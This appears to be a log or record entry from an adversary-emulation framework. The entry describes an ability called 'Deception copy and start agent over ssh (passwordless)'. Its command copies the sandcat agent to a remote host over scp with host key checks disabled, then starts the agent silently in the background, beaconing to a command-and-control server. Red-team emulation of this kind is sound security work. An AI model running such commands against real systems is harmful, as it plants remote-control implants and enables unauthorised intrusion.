chain.command: scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux databaseA@192.168.201.5:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseA@192.168.201.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'
chain.plaintext_command: scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux databaseA@192.168.201.5:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseA@192.168.201.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'

ability.name: Deception copy and start agent over ssh (passwordless)
ability.description: Copy 54ndc47 to remote host and start it
